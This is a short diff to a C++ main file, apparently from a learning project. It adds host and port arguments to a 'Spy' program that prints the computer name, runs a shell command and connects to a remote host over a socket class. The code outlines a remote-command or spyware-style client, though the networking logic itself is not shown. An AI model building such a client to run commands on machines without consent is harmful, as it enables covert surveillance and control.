@@ -1,8 +1,8 @@
 #include "../headers/main.hpp"
+#include "../headers/LPTF_Socket.hpp"
 #include "../../utils/headers/utils.hpp"
 
-
-int main()
+int main(int argc, char *argv[])
 {
     Spy spy;
     std::cout << spy.getComputerName() << std::endl;
@@ -19,6 +19,21 @@ int main()
     std::string command = "mkdir toooooto";
     std::cout << "J'execute la commande : " << command << std::endl;
     spy.executeCommand(command);
+  
+    // inform the user of how to use the program
+    if (argc < 3) 
+    {
+       fprintf(stderr,"usage : %s hostIP port\n", argv[0]);
+       exit(0);
+    }
+
+    char *hostname = argv[1], *serverPort = argv[2];
+
+    LPTF_Socket *socketClass = new LPTF_Socket();
+    socketClass->CreateSocket(serverPort);
+    socketClass->ConnectToHost(hostname);
+    socketClass->ExchangeWithHost();
+    socketClass->CloseSocket();
 
     return 0;
 }
